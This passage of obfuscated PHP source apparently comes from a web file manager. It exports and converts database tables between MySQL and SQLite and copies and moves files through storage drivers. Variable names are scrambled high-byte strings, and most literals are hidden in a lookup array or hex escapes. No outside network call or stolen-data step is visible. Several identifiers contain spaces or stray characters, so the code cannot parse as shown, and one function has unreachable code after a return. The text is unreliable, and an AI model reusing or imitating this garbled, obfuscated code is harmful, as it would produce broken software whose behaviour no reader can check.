$˜¹şÙ·Ê->execute("\144\162\157\x70\40\x74\141\x62\x6c\x65\40\x69\146\40\x65\170\x69\163\x74\163\40\140{$®¦¤ÊãŸ}\x60"); } } private function sqlEncode($ìµˆ©Ûõ) { $ç™¹€ì° =& $_SERVER[÷ôÚîå]; $Ÿõö¦È = array(); foreach ($ìµˆ©Ûõ as $§€¥Ô¡) { if (is_array($§€¥Ô¡)) { $§€¥Ô¡ = json_encode_force($§€¥Ô¡); } $§€¥Ô¡ = addslashes($§€¥Ô¡); $§€¥Ô¡ = str_replace(array($ç™¹€ì°[1168], $ç™¹€ì°[65], $ç™¹€ì°[427]), array($ç™¹€ì°[1169], $ç™¹€ì°[1170], $ç™¹€ì°[1171]), $§€¥Ô¡); $Ÿõö¦È[] = $§€¥Ô¡; } return $ç™¹€ì°[58] . implode($ç™¹€ì°[1172], $Ÿõö¦È) . $ç™¹€ì°[58]; } private function sqlDecode($¸…ĞÖ—á, $œ¦şó–«, $³²â³ó = '') { $© „òË =& $_SERVER[÷ôÚîå]; $¸…ĞÖ—á = str_replace(array($© „òË[1169], $© „òË[1170], $© „òË[1171]), array($© „òË[1168], $© „òË[65], $© „òË[427]), $¸…ĞÖ—á); if ($œ¦şó–« == $© „òË[13]) { $¸…ĞÖ—á = str_ireplace($© „òË[1173], $© „òË[59], $¸…ĞÖ—á); $¸…ĞÖ—á = stripslashes($¸…ĞÖ—á); } return preg_replace($© „òË[1174], $© „òË[12], $¸…ĞÖ—á); if ($œ¦şó–« == $© „òË[13]) { return $³²â³ó != $© „òË[1175] ? stripslashes($¸…ĞÖ—á) : $¸…ĞÖ—á; } if ($³²â³ó == $© „òË[1175]) { $¸…ĞÖ—á = str_replace($© „òË[1176], $© „òË[131], stripslashes($¸…ĞÖ—á)); } return $¸…ĞÖ—á; } public function getSqlFile($ó¹äêäœ = '') { $Ëµë´«¶ =& $_SERVER[÷ôÚîå]; $¬Ëîò½ª = $this->dbType(!0); $ßä’¸š¨ = CONTROLLER_DIR . "\151\156\x73\164\141\x6c\154\57\144\x61\x74\141\57{$¬Ëîò½ª}\56\x73\x71\154"; $ªìÑñÎÔ = file_get_contents($ßä’¸š¨); $¬¹™ãø’ = $Ëµë´«¶[1177] . ($¬Ëîò½ª == $Ëµë´«¶[894] ? $Ëµë´«¶[1178] : $Ëµë´«¶[1179]) . $Ëµë´«¶[1180]; preg_match_all($¬¹™ãø’, $ªìÑñÎÔ, $§€µø¥•); $²½ÙÛú = $§€µø¥•[1]; $‘Ú£ì‚³ = $this->model()->db(); $Šªôã§Û = $‘Ú£ì‚³->getTables(); $—ƒå’ğş = TEMP_FILES . $Ëµë´«¶[1181] . date($Ëµë´«¶[281]) . $Ëµë´«¶[8]; del_dir($—ƒå’ğş); mk_dir($—ƒå’ğş); $˜êÊÅ˜ = $—ƒå’ğş . $Ëµë´«¶[1182]; $ÌÂ‚ØÄØ = $—ƒå’ğş . $Ëµë´«¶[1183]; $­ßí®Í = $¬Ëîò½ª == $Ëµë´«¶[13] ? $Ëµë´«¶[894] : $Ëµë´«¶[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\x74\141\154\x6c\x2f\144\x61\x74\141\57{$­ßí®Í}\56\x73\161\154", $—ƒå’ğş); @touch($—ƒå’ğş . $¬Ëîò½ª . $Ëµë´«¶[877]); $Ó˜Ç²º‰ = fopen($˜êÊÅ˜, $Ëµë´«¶[1156]); $‹›à¦Ùæ = fopen($ÌÂ‚ØÄØ, $Ëµë´«¶[1156]); if ($¬Ëîò½ª == $Ëµë´«¶[13]) { $Šªôã§Û = array_diff($Šªôã§Û, array($Ëµë´«¶[869], $Ëµë´«¶[870])); $ÃöÊÃ¿ = array($Ëµë´«¶[1184], $Ëµë´«¶[1185], $Ëµë´«¶[1186]); fwrite($‹›à¦Ùæ, implode(PHP_EOL, $ÃöÊÃ¿) . PHP_EOL . PHP_EOL); foreach ($Šªôã§Û as $ñö„‰Œé) { $Ÿ‹€Ñ­ = $this->sqlFromSqlite($ñö„‰Œé); if (!$Ÿ‹€Ñ­[$Ëµë´«¶[13]]) { continue; } fwrite($‹›à¦Ùæ, $Ÿ‹€Ñ­[$Ëµë´«¶[13]] . PHP_EOL . PHP_EOL); if (!in_array($ñö„‰Œé, $²½ÙÛú)) { fwrite($Ó˜Ç²º‰, $Ÿ‹€Ñ­[$Ëµë´«¶[894]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Šªôã§Û as $ñö„‰Œé) { $Ÿ‹€Ñ­ = $this->sqlFromMysql($ñö„‰Œé); if (!$Ÿ‹€Ñ­[$Ëµë´«¶[894]]) { continue; } fwrite($Ó˜Ç²º‰, $Ÿ‹€Ñ­[$Ëµë´«¶[894]] . PHP_EOL . PHP_EOL); if (!in_array($ñö„‰Œé, $²½ÙÛú)) { fwrite($‹›à¦Ùæ, $Ÿ‹€Ñ­[$Ëµë´«¶[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ó˜Ç²º‰); fclose($‹›à¦Ùæ); $ªìÑñÎÔ = array($Ëµë´«¶[894] => $˜êÊÅ˜, $Ëµë´«¶[13] => $ÌÂ‚ØÄØ); return $ó¹äêäœ ? $ªìÑñÎÔ[$ó¹äêäœ] : $ªìÑñÎÔ; } public function dbType($œå…±ä = false) { $Ñ¯Œû =& $_SERVER[÷ôÚîå]; $³ä„ş¬õ = $œå…±ä ? $GLOBALS[$Ñ¯Œû[6]][$Ñ¯Œû[21]] : $this->database; $³ä„ş¬õ = array_change_key_case($³ä„ş¬õ); $ÎÖÖ÷­‘ = $³ä„ş¬õ[$Ñ¯Œû[1056]]; if ($ÎÖÖ÷­‘ == $Ñ¯Œû[1053]) { $Á–¿§™¥ = explode($Ñ¯Œû[4], $³ä„ş¬õ[$Ñ¯Œû[1062]]); $ÎÖÖ÷­‘ = $Á–¿§™¥[0]; } $Òä Úàâ = array($Ñ¯Œû[1187] => $Ñ¯Œû[13], $Ñ¯Œû[1001] => $Ñ¯Œû[894]); if (isset($Òä Úàâ[$ÎÖÖ÷­‘])) { $ÎÖÖ÷­‘ = $Òä Úàâ[$ÎÖÖ÷­‘]; } return $ÎÖÖ÷­‘; } public function sqlFromMysql($®¶ãÆ¸, $²§ÂÃû = '') { $½…¢«Ø =& $_SERVER[÷ôÚîå]; $ı©ì© = $this->model()->db(); $¨¨ÚüşÑ = $ı©ì©->query($½…¢«Ø[1188] . $®¶ãÆ¸ . $½…¢«Ø[470]); if (!$¨¨ÚüşÑ || !$¨¨ÚüşÑ[0]) { return !1; } $ş™Á»œĞ = _get($¨¨ÚüşÑ[0], $½…¢«Ø[1189], $½…¢«Ø[12]); if (!$ş™Á»œĞ) { return !1; } $ÎßµÒ¡ı = "\x44\122\117\x50\x20\x54\x41\x42\114\105\40\x49\106\40\x45\130\111\x53\x54\x53\x20\140{$®¶ãÆ¸}\140\73" . PHP_EOL . $ş™Á»œĞ . $½…¢«Ø[84]; if ($²§ÂÃû && $²§ÂÃû == $½…¢«Ø[894]) { return $ÎßµÒ¡ı; } $ÒßÛî¼ = array_change_key_case($GLOBALS[$½…¢«Ø[6]][$½…¢«Ø[21]]); $öôı¯ºÍ = $ÒßÛî¼[$½…¢«Ø[1061]]; $ß÷üËŸ = $½…¢«Ø[1190] . $öôı¯ºÍ . $½…¢«Ø[1191] . $®¶ãÆ¸ . $½…¢«Ø[58]; $–•»®¼¬ = $½…¢«Ø[1192] . $®¶ãÆ¸ . $½…¢«Ø[989]; $à™åùÙÊ = $ı©ì©->query($ß÷üËŸ); if (empty($à™åùÙÊ)) { $ì‰¯€î = array($½…¢«Ø[894] => $½…¢«Ø[12], $½…¢«Ø[13] => $½…¢«Ø[12]); return $²§ÂÃû ? $ì‰¯€î[$²§ÂÃû] : $ì‰¯€î; } $ìàë•ß® = $ı©ì©->query($–•»®¼¬); $¬ìÅ©‹ş = $½…¢«Ø[12]; $Â³´‚ô = array(); foreach ($ìàë•ß® as $¼ÅÕŸ§ò) { if (!$¬ìÅ©‹ş && $¼ÅÕŸ§ò[$½…¢«Ø[1193]] == $½…¢«Ø[1194]) { $¬ìÅ©‹ş = $¼ÅÕŸ§ò[$½…¢«Ø[1195]]; } if (isset($Â³´‚ô[$¼ÅÕŸ§ò[$½…¢«Ø[1193]]])) { $Â³´‚ô[$¼ÅÕŸ§ò[$½…¢«Ø[1193]]][$½…¢«Ø[1196]][] = $¼ÅÕŸ§ò[$½…¢«Ø[1195]]; continue; } $Â³´‚ô[$¼ÅÕŸ§ò[$½…¢«Ø[1193]]] = array($½…¢«Ø[1197] => $¼ÅÕŸ§ò[$½…¢«Ø[1193]], $½…¢«Ø[1196] => array($¼ÅÕŸ§ò[$½…¢«Ø[1195]]), $½…¢«Ø[1198] => $¼ÅÕŸ§ò[$½…¢«Ø[1199]] == $½…¢«Ø[101] ? 0 : 1); } $ˆû‘¸Àé = array(); foreach ($Â³´‚ô as $¼ÅÕŸ§ò) { $æü…¿›Ò = $¼ÅÕŸ§ò[$½…¢«Ø[1197]] == $½…¢«Ø[1194]; $ì¼â¿ — = array($½…¢«Ø[1200], $¼ÅÕŸ§ò[$½…¢«Ø[1198]] == $½…¢«Ø[101] && !$æü…¿›Ò ? $½…¢«Ø[1201] : $½…¢«Ø[12], $½…¢«Ø[1202], $½…¢«Ø[1203] . $®¶ãÆ¸ . $½…¢«Ø[11] . ($æü…¿›Ò ? $½…¢«Ø[1204] : $¼ÅÕŸ§ò[$½…¢«Ø[1197]]) . $½…¢«Ø[131], $½…¢«Ø[1205], $½…¢«Ø[131] . $®¶ãÆ¸ . $½…¢«Ø[131], $½…¢«Ø[1206] . implode($½…¢«Ø[1207], $¼ÅÕŸ§ò[$½…¢«Ø[1196]]) . $½…¢«Ø[1208]); $ˆû‘¸Àé[] = implode($½…¢«Ø[53], $ì¼â¿ —) . $½…¢«Ø[84]; } $ºş«›Šû = array(); $şùë‡û· = array($½…¢«Ø[1209] => $½…¢«Ø[1210], $½…¢«Ø[1210] => $½…¢«Ø[1210], $½…¢«Ø[373] => $½…¢«Ø[400], $½…¢«Ø[372] => $½…¢«Ø[400]); foreach ($à™åùÙÊ as $¼ÅÕŸ§ò) { $ì¼â¿ — = array($½…¢«Ø[131] . $¼ÅÕŸ§ò[$½…¢«Ø[1211]] . $½…¢«Ø[131], isset($şùë‡û·[$¼ÅÕŸ§ò[$½…¢«Ø[1212]]]) ? $şùë‡û·[$¼ÅÕŸ§ò[$½…¢«Ø[1212]]] : $¼ÅÕŸ§ò[$½…¢«Ø[1213]], $¼ÅÕŸ§ò[$½…¢«Ø[1214]] == $½…¢«Ø[987] ? $½…¢«Ø[1215] : $½…¢«Ø[1216], $¼ÅÕŸ§ò[$½…¢«Ø[1211]] == $¬ìÅ©‹ş ? $½…¢«Ø[1217] : $½…¢«Ø[12], $¼ÅÕŸ§ò[$½…¢«Ø[1038]] ? strtoupper(str_replace($½…¢«Ø[11], $½…¢«Ø[12], $¼ÅÕŸ§ò[$½…¢«Ø[1038]])) : $½…¢«Ø[12]); $ºş«›Šû[] = trim(implode($½…¢«Ø[53], $ì¼â¿ —)); } $…½ıåÙ = array($½…¢«Ø[1218] . $®¶ãÆ¸ . $½…¢«Ø[1219], $½…¢«Ø[1220] . $®¶ãÆ¸ . $½…¢«Ø[1221], implode($½…¢«Ø[50] . PHP_EOL, $ºş«›Šû), $½…¢«Ø[1035]); $õï³ Ğ = implode(PHP_EOL, array_merge($…½ıåÙ, $ˆû‘¸Àé)); if ($²§ÂÃû && $²§ÂÃû == $½…¢«Ø[13]) { return $õï³ Ğ; } $ì‰¯€î = array($½…¢«Ø[894] => $ÎßµÒ¡ı, $½…¢«Ø[13] => $õï³ Ğ); return $²§ÂÃû ? $ì‰¯€î[$²§ÂÃû] : $ì‰¯€î; } public function sqlFromSqlite($½³˜Âñİ, $…ÕÃÚ¯è = '') { $›Ø ÀøÚ =& $_SERVER[÷ôÚîå]; $µÉîÔ¹© = $this->model()->db(); $–ë‡ßô = "\x50\x52\x41\107\115\x41\x20\x54\101\102\x4c\105\137\111\x4e\x46\x4f\40\50\x27{$½³˜Âñİ}\x27\x29"; $®ˆ“Îñ = "\123\x45\114\105\x43\124\x20\x2a\x20\x46\122\x4f\x4d\40\163\161\154\151\x74\x65\x5f\x6d\141\163\x74\145\162\40\127\x48\x45\122\105\x20\164\x62\154\x5f\x6e\x61\155\x65\40\75\40\47{$½³˜Âñİ}\47"; $¹²Üüç = $µÉîÔ¹©->query($–ë‡ßô); if (empty($¹²Üüç)) { $Õå¡Û¬  = array($›Ø ÀøÚ[894] => $›Ø ÀøÚ[12], $›Ø ÀøÚ[13] => $›Ø ÀøÚ[12]); return $…ÕÃÚ¯è ? $Õå¡Û¬ [$…ÕÃÚ¯è] : $Õå¡Û¬ ; } $®›­è“° = $µÉîÔ¹©->query($®ˆ“Îñ); $‹ÌÊÙµ÷ = $ ¢ß’Ú¸ = array(); foreach ($®›­è“° as $óâæà¦) { if ($óâæà¦[$›Ø ÀøÚ[33]] == $›Ø ÀøÚ[365]) { $‹ÌÊÙµ÷[] = $óâæà¦[$›Ø ÀøÚ[1222]]; } else { $ ¢ß’Ú¸[$óâæà¦[$›Ø ÀøÚ[32]]] = $óâæà¦[$›Ø ÀøÚ[1222]]; } } $·¹‘«±º = array_merge(array($›Ø ÀøÚ[1218] . $½³˜Âñİ . $›Ø ÀøÚ[131]), $‹ÌÊÙµ÷, array_values($ ¢ß’Ú¸)); $·¹‘«±º = implode($›Ø ÀøÚ[84] . PHP_EOL, $·¹‘«±º) . $›Ø ÀøÚ[84]; if ($…ÕÃÚ¯è && $…ÕÃÚ¯è == $›Ø ÀøÚ[13]) { return $·¹‘«±º; } $ÖÀ™ÆîŠ = array(); $¯Çæ±¹ = array($›Ø ÀøÚ[1210] => $›Ø ÀøÚ[1223], $›Ø ÀøÚ[400] => $›Ø ÀøÚ[1224]); $òıŒ°ìÏ = $›Ø ÀøÚ[12]; foreach ($¹²Üüç as $óâæà¦) { if ($óâæà¦[$›Ø ÀøÚ[57]] == $›Ø ÀøÚ[101]) { $òıŒ°ìÏ = $óâæà¦[$›Ø ÀøÚ[32]]; } $¾…æì = array($›Ø ÀøÚ[470] . $óâæà¦[$›Ø ÀøÚ[32]] . $›Ø ÀøÚ[470], isset($¯Çæ±¹[$óâæà¦[$›Ø ÀøÚ[33]]]) ? $¯Çæ±¹[$óâæà¦[$›Ø ÀøÚ[33]]] : $óâæà¦[$›Ø ÀøÚ[33]], $óâæà¦[$›Ø ÀøÚ[35]] == $›Ø ÀøÚ[101] ? $›Ø ÀøÚ[1215] : $›Ø ÀøÚ[1225] . $óâæà¦[$›Ø ÀøÚ[56]], $óâæà¦[$›Ø ÀøÚ[57]] == $›Ø ÀøÚ[101] ? $›Ø ÀøÚ[1226] : $›Ø ÀøÚ[12]); $ÖÀ™ÆîŠ[] = trim(implode($›Ø ÀøÚ[53], $¾…æì)); } foreach ($ ¢ß’Ú¸ as $ìôæ×‘ => $ÜèáĞš) { $í¥ÈÌ«› = str_replace($›Ø ÀøÚ[1227] . $½³˜Âñİ . $›Ø ÀøÚ[11], $›Ø ÀøÚ[12], $ìôæ×‘); $·›¨éÖß = str_replace(array($›Ø ÀøÚ[131], $›Ø ÀøÚ[1046]), $›Ø ÀøÚ[470], substr($ÜèáĞš, stripos($ÜèáĞš, $›Ø ÀøÚ[346]))); if ($í¥ÈÌ«› == $›Ø ÀøÚ[1204]) { $šÌçğÌø = $›Ø ÀøÚ[1228] . $òıŒ°ìÏ . $›Ø ÀøÚ[1229]; } else { $šÌçğÌø = (stripos($í¥ÈÌ«›, $›Ø ÀøÚ[11]) ? $›Ø ÀøÚ[1230] : $›Ø ÀøÚ[12]) . ($›Ø ÀøÚ[1231] . $í¥ÈÌ«› . $›Ø ÀøÚ[1232] . $·›¨éÖß); } $ÖÀ™ÆîŠ[] = $šÌçğÌø; } $Óµı¤Ø = array($›Ø ÀøÚ[1233] . $½³˜Âñİ . $›Ø ÀøÚ[1234], $›Ø ÀøÚ[1235] . $½³˜Âñİ . $›Ø ÀøÚ[1236], implode($›Ø ÀøÚ[50] . PHP_EOL, $ÖÀ™ÆîŠ), $›Ø ÀøÚ[1237]); $ûÂ§á»û = implode(PHP_EOL, $Óµı¤Ø); if ($…ÕÃÚ¯è && $…ÕÃÚ¯è == $›Ø ÀøÚ[894]) { return $ûÂ§á»û; } $Õå¡Û¬  = array($›Ø ÀøÚ[894] => $ûÂ§á»û, $›Ø ÀøÚ[13] => $·¹‘«±º); return $…ÕÃÚ¯è ? $Õå¡Û¬ [$…ÕÃÚ¯è] : $Õå¡Û¬ ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ßêÛÀŞ”, $ÆöˆÕèÆ) { $Œ¡¼§™à =& $_SERVER[÷ôÚîå]; $áÈÈœ‚× = $ÆöˆÕèÆ; $GLOBALS[$Œ¡¼§™à[1238]] = $Œ¡¼§™à[1239] . $ßêÛÀŞ”; Hook::trigger($Œ¡¼§™à[1239] . $ßêÛÀŞ” . $Œ¡¼§™à[1240], $áÈÈœ‚×); $ñ®¦‡ƒ = self::driverMake($ÆöˆÕèÆ[0]); if (!$ñ®¦‡ƒ) { return !1; } if (method_exists($ñ®¦‡ƒ, $ßêÛÀŞ”)) { $Ì¿ÉõÏ = @call_user_func_array(array($ñ®¦‡ƒ, $ßêÛÀŞ”), $ÆöˆÕèÆ); } else { if (method_exists($ñ®¦‡ƒ, $Œ¡¼§™à[1241])) { $Ì¿ÉõÏ = @call_user_func_array(array($ñ®¦‡ƒ, $ßêÛÀŞ”), $ÆöˆÕèÆ); } else { if (method_exists(self, $ßêÛÀŞ”)) { $Ì¿ÉõÏ = @call_user_func_array(array(self, $ßêÛÀŞ”), $ÆöˆÕèÆ); } else { $Ì¿ÉõÏ = call_user_func_array(array(parent, $ßêÛÀŞ”), $ÆöˆÕèÆ); } } } Hook::trigger($Œ¡¼§™à[1239] . $ßêÛÀŞ” . $Œ¡¼§™à[1242], $áÈÈœ‚×, $Ì¿ÉõÏ); return $Ì¿ÉõÏ; } public static function init($ÅöŞÙÆ) { return self::driverMake($ÅöŞÙÆ); } public static function copy($³ä½ğƒ‰, $ù‚šÒı, $Ö÷…®Ï“ = false, $¦²êçÍë = false) { return self::copyMoveStart($³ä½ğƒ‰, $ù‚šÒı, $Ö÷…®Ï“, $_SERVER[÷ôÚîå][627], $¦²êçÍë); } public static function move($‘Í¬Îã, $š²×éĞÙ, $õ„¸¸˜„ = false, $Å©½×å = false) { return self::copyMoveStart($‘Í¬Îã, $š²×éĞÙ, $õ„¸¸˜„, $_SERVER[÷ôÚîå][629], $Å©½×å); } private static function copyMoveStart($ØŠîô€ß, $“«âÏ‚ë, $×»‘Ğ‡, $òÁŠøé, $ÖÎ „†Ñ) { $ã†éô¿¸ =& $_SERVER[÷ôÚîå]; $â­ü·Ô‡ = array($ØŠîô€ß, $“«âÏ‚ë, $×»‘Ğ‡, $ÖÎ „†Ñ); Hook::trigger($ã†éô¿¸[1239] . $òÁŠøé . $ã†éô¿¸[1240], $â­ü·Ô‡); $šüŠí‚ = self::copyMove($ØŠîô€ß, $“«âÏ‚ë, $×»‘Ğ‡, $òÁŠøé, $ÖÎ „†Ñ); Hook::trigger($ã†éô¿¸[1239] . $òÁŠøé . $ã†éô¿¸[1242], $â­ü·Ô‡, $šüŠí‚); return $šüŠí‚; } public static function saveFile($ ª—Œâî, $’½ÖáØ, $ĞšŒŸ± = true) { $Ë‘±à…Ó =& $_SERVER[÷ôÚîå]; $…»ØñÀ— = self::info($’½ÖáØ); $Óä£Õ¶Å = self::driverMake($ ª—Œâî); $ÈšÂœÙ¸ = self::driverMake($’½ÖáØ); $÷ˆšşà³ = !1; if ($ÈšÂœÙ¸->pathParse[$Ë‘±à…Ó[1243]]) { $÷ˆšşà³ = $ÈšÂœÙ¸; $Œê´ôü“ = $ÈšÂœÙ¸->pathParse[$Ë‘±à…Ó[1243]]; $ÈšÂœÙ¸ = self::driverMake($Œê´ôü“); } if ($Óä£Õ¶Å->pathParse[$Ë‘±à…Ó[1243]]) { $—…´Àö± = $Óä£Õ¶Å->pathParse[$Ë‘±à…Ó[1243]]; $Óä£Õ¶Å = self::driverMake($—…´Àö±); } $·’øı‚Ğ = $ÈšÂœÙ¸->pathFather($’½ÖáØ); $›€—€©Ì = !0; if (!$ĞšŒŸ± && self::driverIsSame($Óä£Õ¶Å, $ÈšÂœÙ¸)) { $›€—€©Ì = !1; } $¾›Ø‹ò = self::copyFile($Óä£Õ¶Å, $ ª—Œâî, $ÈšÂœÙ¸, $·’øı‚Ğ, $…»ØñÀ—[$Ë‘±à…Ó[32]], $›€—€©Ì); if ($÷ˆšşà³) { $¾›Ø‹ò = $÷ˆšşà³->getPathOuter($¾›Ø‹ò); } return $¾›Ø‹ò; } private static function copyMove($ĞÒ‰öäã, $éªÎÄä©, $’¡ÌüØ, $Ìö¡—¼, $áøÆó« = false) { $¼¶ç²ù =& $_SERVER[÷ôÚîå]; if (!$ĞÒ‰öäã || $ĞÒ‰öäã == $¼¶ç²ù[8] || !$éªÎÄä©) { return !1; } ignore_timeout(); $×§ÆÌÄÔ = self::driverMake($ĞÒ‰öäã); $ä½Ø‹„Í = self::driverMake($éªÎÄä©); $µÂÅê¼ = $Ìö¡—¼ == $¼¶ç²ù[629]; $°éŞê× = !1; if ($ä½Ø‹„Í->pathParse[$¼¶ç²ù[1243]]) { $°éŞê× = $ä½Ø‹„Í; $éªÎÄä© = $ä½Ø‹„Í->pathParse[$¼¶ç²ù[1243]]; $ä½Ø‹„Í = self::driverMake($éªÎÄä©); } if ($×§ÆÌÄÔ->pathParse[$¼¶ç²ù[1243]]) { $ĞÒ‰öäã = $×§ÆÌÄÔ->pathParse[$¼¶ç²ù[1243]]; $×§ÆÌÄÔ = self::driverMake($ĞÒ‰öäã); } self::check($×§ÆÌÄÔ, $ĞÒ‰öäã, $ä½Ø‹„Í, $éªÎÄä©); Hook::trigger($¼¶ç²ù[1244], $×§ÆÌÄÔ, $ĞÒ‰öäã, $ä½Ø‹„Í, $éªÎÄä©); $ç¥­›€ = self::driverIsSame($×§ÆÌÄÔ, $ä½Ø‹„Í); if ($ç¥­›€) { if ($Ìö¡—¼ == $¼¶ç²ù[629] && !method_exists($ä½Ø‹„Í, $¼¶ç²ù[1245]) && trim($éªÎÄä©, $¼¶ç²ù[8]) == trim($ä½Ø‹„Í->pathFather($ĞÒ‰öäã), $¼¶ç²ù[8])) { if ($×§ÆÌÄÔ->pathThis($ĞÒ‰öäã) != $áøÆó« && !$×§ÆÌÄÔ->isOsDriver()) { return $×§ÆÌÄÔ->rename($ĞÒ‰öäã, $áøÆó«); } return $ä½Ø‹„Í->getPathOuter($ĞÒ‰öäã); } if (method_exists($ä½Ø‹„Í, $Ìö¡—¼)) { return $ä½Ø‹„Í->{$Ìö¡—¼}($ĞÒ‰öäã, $éªÎÄä©, $’¡ÌüØ, $áøÆó«); } } if ($ç¥­›€ && $Ìö¡—¼ == $¼¶ç²ù[629] && $ä½Ø‹„Í->getType() == $¼¶ç²ù[119]) { $¥Ùóøä = $ä½Ø‹„Í->movePath($ĞÒ‰öäã, $éªÎÄä©, $áøÆó«); if ($¥Ùóøä) { return $¥Ùóøä; } } $Æï’Áï = $×§ÆÌÄÔ->isFile($ĞÒ‰öäã); if (!$Æï’Áï && $ä½Ø‹„Í->getType() == $¼¶ç²ù[846] && $×§ÆÌÄÔ->getType() == $¼¶ç²ù[119]) { $¥Ùóøä = $ä½Ø‹„Í->copyFolderFromIO($×§ÆÌÄÔ, $ĞÒ‰öäã, $éªÎÄä©, $’¡ÌüØ, $µÂÅê¼, $áøÆó«); } else { $¥Ùóøä = self::copyPath($×§ÆÌÄÔ, $ĞÒ‰öäã, $ä½Ø‹„Í, $éªÎÄä©, $’¡ÌüØ, $µÂÅê¼, $Æï’Áï, $áøÆó«); } if ($¥Ùóøä && $µÂÅê¼) { $×§ÆÌÄÔ->remove($ĞÒ‰öäã); } if ($°éŞê×) { $¥Ùóøä = $°éŞê×->getPathOuter($¥Ùóøä); } return $¥Ùóøä; } private static function check($şË®Õ, $ƒ®ú¢ßÛ, $»…óØÒì, &$ÒÔò•­Š) { $çÆËœ˜ˆ =& $_SERVER[÷ôÚîå]; if (self::driverIsSame($şË®Õ, $»…óØÒì) && $şË®Õ->isFolder($ƒ®ú¢ßÛ) && $şË®Õ->isParentOf($ƒ®ú¢ßÛ, $ÒÔò•­Š)) { show_json(LNG($çÆËœ˜ˆ[1246]), !1); } if (!$şË®Õ->exist($ƒ®ú¢ßÛ)) { show_json(LNG($çÆËœ˜ˆ[118]), !1); } } private static function copyPath($ü¿àùº, $øÆŸùõ, $™¬ÊÒ¹, $«¨´‡Â, $ğ°‚„£®, $ÉŠºšşç, $ƒ ğä÷Ã, $µª‘ğË© = false, $—âÏª„ = true) { $¯²ŸšÀ =& $_SERVER[÷ôÚîå]; $°±µÁšì = empty($µª‘ğË©) && $µª‘ğË© !== $¯²ŸšÀ[238] ? $ü¿àùº->pathThis($øÆŸùõ) : $µª‘ğË©; if ($ğ°‚„£®) { $€‰ÔºÎÙ = $™¬ÊÒ¹->fileNameExist($«¨´‡Â, $°±µÁšì); $üá†‹çº = $°±µÁšì; $°±µÁšì = $™¬ÊÒ¹->fileNameAuto($«¨´‡Â, $°±µÁšì, $ğ°‚„£®, !$ƒ ğä÷Ã); if (!$€‰ÔºÎÙ || $üá†‹çº != $°±µÁšì) { $ğ°‚„£® = !1; } if ($—âÏª„ && !$ğ°‚„£®) { $™¬ÊÒ¹->_data[$¯²ŸšÀ[1247]] = !0; } } if ($ƒ ğä÷Ã) { return self::copyFile($ü¿àùº, $øÆŸùõ, $™¬ÊÒ¹, $«¨´‡Â, $°±µÁšì, $ÉŠºšşç); } if ($ğ°‚„£® == REPEAT_RENAME_FOLDER) { $ğ°‚„£® = !1; } $ï–°»Ö… = rtrim($«¨´‡Â, $¯²ŸšÀ[8]) . $¯²ŸšÀ[8] . $°±µÁšì; $Éáì‹…ë = $™¬ÊÒ¹->mkdir($™¬ÊÒ¹->getPath($ï–°»Ö…), $ğ°‚„£®); $«¨´‡Â = $™¬ÊÒ¹->getPathInner($Éáì‹…ë); $ø±¡ØªÙ = $ü¿àùº->listPath($øÆŸùõ, !0); $ø±¡ØªÙ = is_array($ø±¡ØªÙ) ? $ø±¡ØªÙ : array($¯²ŸšÀ[96] => array(), $¯²ŸšÀ[95] => array()); $û„¼•¹˜ = array_merge($ø±¡ØªÙ[$¯²ŸšÀ[96]], $ø±¡ØªÙ[$¯²ŸšÀ[95]]); foreach ($û„¼•¹˜ as $À÷àà²¬) { $½¿¯ãÕ = $À÷àà²¬[$¯²ŸšÀ[33]] == $¯²ŸšÀ[240]; $øÆŸùõ = $ü¿àùº->getPathInner($À÷àà²¬[$¯²ŸšÀ[97]]); $¾Ì¡§“ê = self::copyPath($ü¿àùº, $øÆŸùõ, $™¬ÊÒ¹, $«¨´‡Â, $ğ°‚„£®, $ÉŠºšşç, $½¿¯ãÕ, !1, !1); if (!$¾Ì¡§“ê) { IO::errorTips($¯²ŸšÀ[1248] . $øÆŸùõ . $¯²ŸšÀ[83] . $«¨´‡Â); } } self::copyMoveKeepInfo($ü¿àùº, $øÆŸùõ, $Éáì‹…ë); return $Éáì‹…ë; } private static function copyFile($ˆÑôÙ›è, $›ßç, $»¶Ãš°, $ƒ‚Ú²™¯, $ç©ı¼é, $ÊŒØ‰ç‡) { $íØ½š½† =& $_SERVER[÷ôÚîå]; $ƒ‚Ú²™¯ = $»¶Ãš°->getPath(rtrim($ƒ‚Ú²™¯, $íØ½š½†[8]) . $íØ½š½†[8] . $ç©ı¼é); $À›Ôó„ë = $íØ½š½†[1249] . time() . rand_string(5); Hook::trigger($íØ½š½†[1250], $ˆÑôÙ›è, $›ßç, $»¶Ãš°, $ƒ‚Ú²™¯, $ç©ı¼é, $À›Ôó„ë); if (self::driverIsSame($ˆÑôÙ›è, $»¶Ãš°)) { if ($ÊŒØ‰ç‡) { $¿ÓîÖ™é = $»¶Ãš°->moveFile($›ßç, $ƒ‚Ú²™¯); } else { $¿ÓîÖ™é = $»¶Ãš°->copyFile($›ßç, $ƒ‚Ú²™¯); } Hook::trigger($íØ½š½†[1251], $ˆÑôÙ›è, $›ßç, $»¶Ãš°, $ƒ‚Ú²™¯, $ç©ı¼é, $¿ÓîÖ™é); self::copyMoveKeepInfo($ˆÑôÙ›è, $›ßç, $¿ÓîÖ™é); return $¿ÓîÖ™é; } $İÉİâ¼Ë = TEMP_FILES; if ($GLOBALS[$íØ½š½†[6]][$íØ½š½†[102]][$íØ½š½†[885]]) { $İÉİâ¼Ë = $GLOBALS[$íØ½š½†[6]][$íØ½š½†[102]][$íØ½š½†[885]]; } $«‹—‘ãŸ = $İÉİâ¼Ë; mk_dir($«‹—‘ãŸ); $ïÒÃãŞé = $«‹—‘ãŸ . $À›Ôó„ë; $Ê”¦º‹Ì = $ïÒÃãŞé; $ïÒÃãŞé = $ˆÑôÙ›è->download($›ßç, $ïÒÃãŞé); $ïÒÃãŞé = $ˆÑôÙ›è->iconvApp($ïÒÃãŞé); if (substr($ïÒÃãŞé, strlen($İÉİâ¼Ë)) == $İÉİâ¼Ë) { $ÊŒØ‰ç‡ = !0; } $¿ÓîÖ™é = $»¶Ãš°->upload($ƒ‚Ú²™¯, $ïÒÃãŞé, $ÊŒØ‰ç‡); self::remove($Ê”¦º‹Ì); Hook::trigger($íØ½š½†[1251], $ˆÑôÙ›è, $›ßç, $»¶Ãš°, $ƒ‚Ú²™¯, $ç©ı¼é, $¿ÓîÖ™é); 